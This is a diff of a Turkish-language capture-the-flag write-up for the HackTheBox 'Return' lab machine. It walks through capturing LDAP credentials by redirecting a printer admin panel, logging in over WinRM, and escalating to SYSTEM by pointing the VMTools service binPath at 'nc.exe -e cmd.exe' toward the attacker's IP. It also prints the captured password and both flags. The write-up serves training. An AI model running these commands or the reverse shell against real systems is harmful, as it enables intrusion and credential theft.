@@ -1,312 +1,252 @@
-<img width="686" height="386" alt="maxresdefault" src="https://github.com/user-attachments/assets/5892254c-9f8a-416d-bfb1-f5d1c38def97" />
+<img width="686" height="386" alt="maxresdefault" src="https://github.com/user-attachments/assets/b46a4ece-607f-4104-bcd4-05cba65de478" />
 
-#### About
+## Hakkında
 
-Return is an easy difficulty Windows machine featuring a network printer administration panel that stores LDAP credentials. These credentials can be captured by inputting a malicious LDAP server which allows obtaining foothold on the server through the WinRM service. User found to be part of a privilege group which further exploited to gain system access.
-
-
-İlk olarak nmap taraması ile başlıyoruz 
-- nmap -sS -A -T5 -p- 10.129.51.69
-
-<img width="1026" height="727" alt="nmap" src="https://github.com/user-attachments/assets/9d559d3f-1677-4a0b-80f2-82bf9b5ed23b" />
+Return, LDAP kimlik bilgilerini depolayan bir ağ yazıcı yönetim paneline sahip, zorluk seviyesi kolay bir Windows makinesidir. Bu kimlik bilgileri, kötü amaçlı bir LDAP sunucusu girilerek ele geçirilebilir ve bu da WinRM hizmeti aracılığıyla sunucuya erişim sağlanmasına olanak tanır. Kullanıcının, sistem erişimi elde etmek için daha da kötüye kullanılan bir ayrıcalık grubunun parçası olduğu tespit edilir.
 
 
-İlk olarak 80 portundaki web portuna odaklanalım 
+## Enumeration
 
-<img width="578" height="499" alt="site1" src="https://github.com/user-attachments/assets/a7efae3b-1fa9-4128-bded-efb7e15c7a18" />
+İlk aşamada hedef makinedeki açık portları ve servisleri belirlemek için tam port taraması gerçekleştiriyorum.
 
-<img width="1232" height="377" alt="site2" src="https://github.com/user-attachments/assets/3cac1152-797d-478c-867d-8b477241caa2" />
+```bash
+nmap -sS -A -T5 -p- 10.129.51.69
+```
 
-şimdi server adress yerine kendi ipmizi yazabiliriz ve 389 portunu dinleyerek gelen giden bilgilere bakabiliriz 
+<img width="1026" height="727" alt="nmap" src="https://github.com/user-attachments/assets/417b070f-195d-40d6-8168-fc98b68b05b3" />
 
-<img width="771" height="352" alt="site3" src="https://github.com/user-attachments/assets/0a141268-a2e0-4e88-94f8-ff124d1af8b0" />
+Tarama sonucunda HTTP, SMB ve WinRM tarafı öne çıkıyor. Özellikle HTTP üzerinde çalışan yönetim arayüzü, ilk erişim için en mantıklı başlangıç noktası.
 
+---
 
-─# rlwrap nc -nvlp 389                                                                                                            
-listening on [any] 389 ...
-connect to [10.10.14.187] from (UNKNOWN) [10.129.51.69] 64032
-0*`%return\svc-printer�
-0*`%return\svc-printer�
- 1edFg43012!!
- ve sonuç olarak böyle bir şifre aldık 
-isterseniz responde da kullanabilirsiniz
+## Printer Management Panel
 
-- sudo responder -I tun0
-[LDAP] Cleartext Client   : 10.129.51.69
-[LDAP] Cleartext Username : return\svc-printer
-[LDAP] Cleartext Password : 1edFg43012!!
+Web servisine eriştiğimde yazıcı yönetimi için kullanılan bir administration paneliyle karşılaşıyorum.
 
-Şimdi nxc kullanarak bilgileri doğrulayalım 
+<img width="578" height="499" alt="site1" src="https://github.com/user-attachments/assets/2cdeaeac-d3ad-4edf-ab06-8c8cbafdaa3d" />
 
-┌──(root㉿kali)-[/home/kali/toolkit]
-└─# nxc smb 10.129.51.69 -u return\svc-printer -p '1edFg43012!!'                
-[*] First time use detected
-[*] Creating home directory structure
-[*] Creating missing folder logs
-[*] Creating missing folder modules
-[*] Creating missing folder workspaces
-[*] Creating missing folder obfuscated_scripts
-[*] Creating missing folder screenshots
-[*] Creating missing folder logs/sam
-[*] Creating missing folder logs/lsa
-[*] Creating missing folder logs/ntds
-[*] Creating missing folder logs/dpapi
-[*] Creating default workspace
-[*] Initializing VNC protocol database
-[*] Initializing SSH protocol database
-[*] Initializing WINRM protocol database
-[*] Initializing RDP protocol database
-[*] Initializing SMB protocol database
-[*] Initializing WMI protocol database
-[*] Initializing LDAP protocol database
-[*] Initializing FTP protocol database
-[*] Initializing NFS protocol database
-[*] Initializing MSSQL protocol database
-[*] Copying default configuration file
-SMB         10.129.51.69    445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.129.51.69    445    PRINTER          [-] return.local\returnsvc-printer:1edFg43012!! STATUS_LOGON_FAILURE 
+Paneli incelediğimde özellikle **Settings** bölümü dikkat çekiyor. Burada LDAP bağlantısına ait yapılandırmanın bulunduğu bir alan mevcut.
+
+<img width="1232" height="377" alt="site2" src="https://github.com/user-attachments/assets/aa0379ec-9fc8-4eb3-b9e5-9e5fb403b4e4" />
+
+Buradaki `Server Address` alanı doğrudan kullanıcı tarafından değiştirilebiliyor. Bu durumda uygulamanın LDAP bağlantısı için güvenilir bir backend yerine bizim belirlediğimiz adresi kullanıp kullanmadığını test etmek mantıklı.
+
+Kendi VPN adresimi LDAP sunucusu olarak tanımlayıp hedefin bu adrese bağlantı kurup kurmadığını dinliyorum.
+
+<img width="771" height="352" alt="site3" src="https://github.com/user-attachments/assets/a86da2ba-4fc6-4bee-8b45-68ada1c9fb37" />
 
 
-şimdi bu bilgileri kullanarak smb içinden veri çekelim 
+## LDAP Credential Interception
 
-- smbmap -H 10.129.51.69 -u svc-printer -p '1edFg43012!!'    
+LDAP için standart port olan `389` üzerinde listener açıyorum:
 
-[+] IP: 10.129.51.69:445	Name: 10.129.51.69        	Status: Authenticated
-	Disk                                                  	Permissions	Comment
-	----                                                  	-----------	-------
-	ADMIN$                                            	READ ONLY	Remote Admin
-	C$                                                	READ ONLY	Default share
-	IPC$                                              	READ ONLY	Remote IPC
-	NETLOGON                                          	READ ONLY	Logon server share 
-	SYSVOL                                            	READ ONLY	Logon server share 
+```bash
+rlwrap nc -nvlp 389
+```
 
-evil-winrm kullanarak bağlanalım 
+Hedef sistem kısa süre içinde bağlantı kuruyor ve authentication sırasında kullanılan kullanıcı bilgilerini gönderiyor:
 
+<img width="576" height="141" alt="nc" src="https://github.com/user-attachments/assets/b98cf995-f272-4ec6-b0d3-206ac9eaa9f7" />
+
+Aynı davranış Responder ile de doğrulanabilir:
+
+```bash
+sudo responder -I tun0
+```
+
+<img width="513" height="163" alt="responder1" src="https://github.com/user-attachments/assets/179f5f45-3b17-484a-8d83-616efaccabc3" />
+
+<img width="496" height="434" alt="responder2" src="https://github.com/user-attachments/assets/c3339815-dfa0-4c8f-a127-ffa29276beef" />
+
+Administration panelindeki LDAP endpoint'i saldırgan tarafından kontrol edilebilir hale geldiği için hedef sistem doğrudan bizim endpoint'imize authentication yapıyor ve `svc-printer` hesabının credential'ları elde edilebiliyor.
+
+---
+
+## Credential Validation
+
+Ele geçirilen credential'ların gerçekten geçerli olup olmadığını önce SMB üzerinden kontrol ediyorum.
+
+```bash
+nxc smb 10.129.51.69 -u 'svc-printer' -p '1edFg43012!!'
+```
+
+<img width="1440" height="505" alt="nxc" src="https://github.com/user-attachments/assets/404dced4-d191-4b3a-9ec5-6e798f4a1aa3" />
+
+
+SMB tarafında kimlik bilgilerinin kabul edildiğini doğruladıktan sonra erişilebilir share'leri kontrol ediyorum:
+
+```bash
+smbmap -H 10.129.51.69 -u 'svc-printer' -p '1edFg43012!!'
+```
+
+<img width="805" height="491" alt="smbmap" src="https://github.com/user-attachments/assets/72a72066-33c7-4dd7-ab2e-6c2f57673af7" />
+
+
+SMB authentication'ın başarılı olması, credential'ların geçerli olduğunu net şekilde ortaya koyuyor. Bir sonraki adımda bu hesapla uzaktan yönetim erişimi aranabilir.
+
+---
+
+## Initial Access — WinRM
+
+`svc-printer` hesabı uzak yönetim için yetkilendirilmiş durumda olduğundan WinRM üzerinden doğrudan shell elde edebiliyorum.
+
+```bash
 evil-winrm -i 10.129.51.69 -u 'svc-printer' -p '1edFg43012!!'
-*Evil-WinRM* PS C:\Users\svc-printer\Documents> ve shell geldi 
+```
+
+<img width="1037" height="204" alt="shell" src="https://github.com/user-attachments/assets/aa7c2419-3ae9-46e0-a80b-f976ee64b29b" />
 
 
-*Evil-WinRM* PS C:\Users\svc-printer> ls
+Başarılı bağlantı sonrası:
 
+```text
+*Evil-WinRM* PS C:\Users\svc-printer\Documents>
+```
 
-    Directory: C:\Users\svc-printer
+İlk olarak kullanıcı dizinini kontrol edip `user.txt` dosyasını alıyorum.
 
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
-d-r---        5/26/2021   2:05 AM                Desktop
-d-r---        5/26/2021   1:51 AM                Documents
-d-r---        9/15/2018  12:19 AM                Downloads
-d-r---        9/15/2018  12:19 AM                Favorites
-d-r---        9/15/2018  12:19 AM                Links
-d-r---        9/15/2018  12:19 AM                Music
-d-r---        9/15/2018  12:19 AM                Pictures
-d-----        9/15/2018  12:19 AM                Saved Games
-d-r---        9/15/2018  12:19 AM                Videos
-
-
-*Evil-WinRM* PS C:\Users\svc-printer> cd Desktop
+```powershell
+cd C:\Users\svc-printer\Desktop
 ls
-*Evil-WinRM* PS C:\Users\svc-printer\Desktop> ls
-
-
-    Directory: C:\Users\svc-printer\Desktop
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--ar---         9/1/2026  12:58 PM             34 user.txt
-
-
-*Evil-WinRM* PS C:\Users\svc-printer\Desktop> cat user.txt
+cat user.txt
 ffafef38c60fa87f5cbd1f1591fbfffa
-*Evil-WinRM* PS C:\Users\svc-printer\Desktop> 
- ve ilk flagimizi alıypruz 
+```
 
-Şimdi sistemde gezinelim ve araştırma yapalım privesc için 
-
-*Evil-WinRM* PS C:\Users\svc-printer\Documents> net user Administrator
-User name                    Administrator
-Full Name
-Comment                      Built-in account for administering the computer/domain
-User's comment
-Country/region code          000 (System Default)
-Account active               Yes
-Account expires              Never
-
-Password last set            7/16/2021 8:03:22 AM
-Password expires             Never
-Password changeable          7/17/2021 8:03:22 AM
-Password required            Yes
-User may change password     Yes
-
-Workstations allowed         All
-Logon script
-User profile
-Home directory
-Last logon                   9/1/2026 12:58:07 PM
-
-Logon hours allowed          All
-
-Local Group Memberships      *Administrators
-Global Group memberships     *Domain Users         *Group Policy Creator
-                             *Schema Admins        *Enterprise Admins
-                             *Domain Admins
- *Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami /groups
-GROUP INFORMATION
------------------
-
-Group Name                                 Type             SID          Attributes
-========================================== ================ ============ ==================================================
-Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
-BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
-Mandatory Label\High Mandatory Level       Label            S-1-16-12288
-
-bu iki çıktı üzerinden sunucu operatör grubu göze çarpıyor bunun üzerine odaklanalım 
-
-https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/master/Privesc/Acl-FullControl.ps1  `SeBackupPrivilege` için bunu kullanarak yetki yükseltme yapabiliriz 
+<img width="484" height="236" alt="userflag" src="https://github.com/user-attachments/assets/1d32a2af-dad0-4b4b-b6bb-b9c1239bc040" />
 
 
-Şimdi yerel ayrıcalık yükseltme (LPE) işlemini gerçekleştirmenin bir yolunu bulmamız gerekiyor. Evil-winrm'nin yerleşik bir menüsü var ve bu menü bize mevcut hizmetlerimizi ve hangi ayrıcalıklara sahip olduğumuzu gösteriyor. Hizmet üzerinde başlatma/durdurma ayrıcalıklarına sahip olduğumuzu görüyoruz `VMTools`.
+## Privilege Escalation Enumeration
 
-*Evil-WinRM* PS C:\Users\svc-printer\Documents> menu
+Foothold elde ettikten sonra doğrudan privilege escalation enumeration'a geçiyorum. İlk kontrol edilmesi gereken noktalardan biri mevcut grup üyelikleri.
 
+```powershell
+whoami /groups
+```
 
-   ,.   (   .      )               "            ,.   (   .      )       .   
-  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
-.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
-_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
-\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
- |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
- |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
-/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
-        \/                               \/          \/       \/         \/
+<img width="1007" height="507" alt="privesc1" src="https://github.com/user-attachments/assets/301fcd8c-983a-458a-86a9-40775d4e568e" />
 
-       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers
+<img width="639" height="307" alt="privesc2" src="https://github.com/user-attachments/assets/e91ae550-dfac-4a67-8cb7-6e0a13c19c6b" />
 
-[+] Bypass-4MSI
-[+] services
-[+] upload
-[+] download
-[+] clear
-[+] cls
-[+] menu
-[+] exit
+<img width="671" height="677" alt="privesc3" src="https://github.com/user-attachments/assets/b3d94739-f899-4f02-a8d6-ecb598a3c6b6" />
 
-*Evil-WinRM* PS C:\Users\svc-printer\Documents> services
+Burada `Server Operators` üyeliği privilege escalation açısından incelenmeye değer. Bu nedenle servisleri ayrıca kontrol ediyorum.
 
-Path                                                                                                                 Privileges Service          
-----                                                                                                                 ---------- -------          
-C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             
-\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys       True MpKslceeb2796    
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
-C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost         
-"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                                                False Sense            
-C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller 
-"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                     True VGAuthService    
-"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                        True VMTools          
-"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe"                                             True WdNisSvc         
-"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe"                                            True WinDefend        
-"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                                                      False WMPNetworkSvc    
+---
 
-*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe query VMTools
- 
+## Service Enumeration
 
+Evil-WinRM içerisinde bulunan `services` fonksiyonu sistemdeki servisleri ve mevcut servis yönetim yetkilerini hızlıca görmek için kullanılabilir.
+
+```powershell
+menu
+services
+```
+<img width="642" height="422" alt="privesc4" src="https://github.com/user-attachments/assets/09429dca-77a7-4797-aaeb-36ca1511edda" />
+
+Listeyi burada özellikle belirli bir mantıkla değerlendiriyorum: amaç rastgele bir servis bulmak değil, mevcut hesabın üzerinde operasyon yapabildiği bir servisi tespit etmek. `VMTools` servisi üzerinde gerekli servis kontrol yetkilerinin bulunduğu görülüyor.
+
+Servisin durumunu doğrudan `sc.exe` ile doğruluyorum:
+
+```powershell
+sc.exe query VMTools
+```
+
+```text
 SERVICE_NAME: VMTools
-        TYPE               : 10  WIN32_OWN_PROCESS
-        STATE              : 4  RUNNING
-                                (STOPPABLE, PAUSABLE, ACCEPTS_PRESHUTDOWN)
-        WIN32_EXIT_CODE    : 0  (0x0)
-        SERVICE_EXIT_CODE  : 0  (0x0)
-        CHECKPOINT         : 0x0
-        WAIT_HINT          : 0x0
-*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe stop VMTools
+TYPE               : 10  WIN32_OWN_PROCESS
+STATE              : 4  RUNNING
+                     (STOPPABLE, PAUSABLE, ACCEPTS_PRESHUTDOWN)
+```
 
-SERVICE_NAME: VMTools
-        TYPE               : 10  WIN32_OWN_PROCESS
-        STATE              : 1  STOPPED
-        WIN32_EXIT_CODE    : 0  (0x0)
-        SERVICE_EXIT_CODE  : 0  (0x0)
-        CHECKPOINT         : 0x0
-        WAIT_HINT          : 0x0
-*Evil-WinRM* PS C:\Users\svc-printer\Documents> locate nc.exe
- 
-The term 'locate' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
-At line:1 char:1
-+ locate nc.exe
-+ ~~~~~~
-    + CategoryInfo          : ObjectNotFound: (locate:String) [], CommandNotFoundException
-    + FullyQualifiedErrorId : CommandNotFoundException
-*Evil-WinRM* PS C:\Users\svc-printer\Documents> upload nc.exe . 
-                                        
-Error: Upload failed. Check filenames or paths: Source file does not exist: /home/kali/nc.exe
-*Evil-WinRM* PS C:\Users\svc-printer\Documents> upload nc.exe . 
-                                        
-Info: Uploading /home/kali/nc.exe to C:\Users\svc-printer\Documents\.
-                                        
-Data: 37544 bytes of 37544 bytes copied
-                                        
-Info: Upload successful!
-*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config VMTools binPath="C:\Users\\svc-printer\documents\nc.exe -e cmd.exe 10.10.14.187 1337"
+Servis durdurulabiliyor:
+
+```powershell
+sc.exe stop VMTools
+```
+
+```text
+[SC] ControlService SUCCESS
+```
+
+<img width="552" height="164" alt="privesc6" src="https://github.com/user-attachments/assets/7e4a859a-fb3d-4f9a-82f1-36ab6ee91a2f" />
+
+<img width="552" height="164" alt="privesc6" src="https://github.com/user-attachments/assets/89c91c78-c982-44f7-b194-0b0ba85db020" />
+
+
+Burada kritik olan yalnızca `stop/start` yetkisi değil. Asıl önemli nokta servis yapılandırmasının değiştirilebilmesi. Bu da `binPath` değerini kontrol ettiğimiz bir executable'a yönlendirme ihtimalini ortaya çıkarıyor.
+
+---
+
+## VMTools Service Abuse
+
+<img width="893" height="72" alt="privesc7" src="https://github.com/user-attachments/assets/2287a2b1-b5f9-496d-9b46-8ffaca4ece9a" />
+
+Öncelikle kullanacağım `nc.exe` binary'sini hedef makineye gönderiyorum.
+
+```powershell
+upload nc.exe .
+```
+
+
+Daha sonra `VMTools` servisinin çalıştırdığı binary path'i kendi executable'ımıza çeviriyorum:
+
+```powershell
+sc.exe config VMTools binPath="C:\Users\\svc-printer\\Documents\\nc.exe -e cmd.exe 10.10.14.187 1337"
+```
+
+```text
 [SC] ChangeServiceConfig SUCCESS
-*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start VMTools 
+```
+
+<img width="1183" height="184" alt="privesc8" src="https://github.com/user-attachments/assets/049d1224-316e-41f7-b297-f7012ce4731f" />
 
 
-VE SHELL GELDİ 
-──(root㉿kali)-[/home/kali]
-└─# rlwrap nc -nvlp 1337
-listening on [any] 1337 ...
+Servis binary'sinin path'i artık kontrol ettiğimiz payload'a işaret ediyor. Sırada kendi makinemizde bağlantıyı beklemek var.
+
+```bash
+rlwrap nc -nvlp 1337
+```
+
+Ardından hedef sistemde servisi yeniden başlatıyorum:
+
+```powershell
+sc.exe start VMTools
+```
+
+Bağlantı geldiğinde:
+
+```text
 connect to [10.10.14.187] from (UNKNOWN) [10.129.51.69] 50654
 Microsoft Windows [Version 10.0.17763.107]
-(c) 2018 Microsoft Corporation. All rights reserved.
-~~~~~~
-C:\Windows\system32>ls
+```
 
-C:\Users>dir
+Shell'in hangi güvenlik bağlamında çalıştığını doğruluyorum:
+
+```cmd
+whoami
+```
+
+Sonuç:
+
+```text
+nt authority\system
+```
+<img width="507" height="192" alt="rootshell" src="https://github.com/user-attachments/assets/78280e1d-bd5b-4d31-bee5-515380de1c63" />
+
+Böylece `svc-printer` hesabından doğrudan **SYSTEM** seviyesine çıkılmış oluyor.
+
+---
+## Root Flag
+
+Artık sistem seviyesinde erişim mevcut. Administrator profilinin Desktop dizinine geçip `root.txt` dosyasını okuyorum.
+
+```cmd
+cd C:\Users\Administrator\Desktop
 dir
- Volume in drive C has no label.
- Volume Serial Number is 3A0C-428E
-
- Directory of C:\Users
-
-05/26/2021  01:51 AM    <DIR>          .
-05/26/2021  01:51 AM    <DIR>          ..
-09/27/2021  04:40 AM    <DIR>          Administrator
-05/26/2021  01:50 AM    <DIR>          Public
-05/26/2021  01:51 AM    <DIR>          svc-printer
-               0 File(s)              0 bytes
-               5 Dir(s)   8,821,932,032 bytes free
-
-C:\Users>cd Administrator
-cd Administrator
-
-C:\Users\Administrator>cd Desktop
-cd Desktop
-
-C:\Users\Administrator\Desktop>dir
-dir
- Volume in drive C has no label.
- Volume Serial Number is 3A0C-428E
-
- Directory of C:\Users\Administrator\Desktop
-
-09/27/2021  04:22 AM    <DIR>          .
-09/27/2021  04:22 AM    <DIR>          ..
-09/01/2026  12:58 PM                34 root.txt
-               1 File(s)             34 bytes
-               2 Dir(s)   8,821,932,032 bytes free
-
-C:\Users\Administrator\Desktop>type root.txt
 type root.txt
+```
+
+```text
 924469a2a0f2fc8c5b8be6f50d57190e
-
-
-ve son flagi de aldık 
+```
+<img width="413" height="301" alt="rootflag" src="https://github.com/user-attachments/assets/82aca659-b50d-46f2-9b6e-0a7c45a19ef6" />
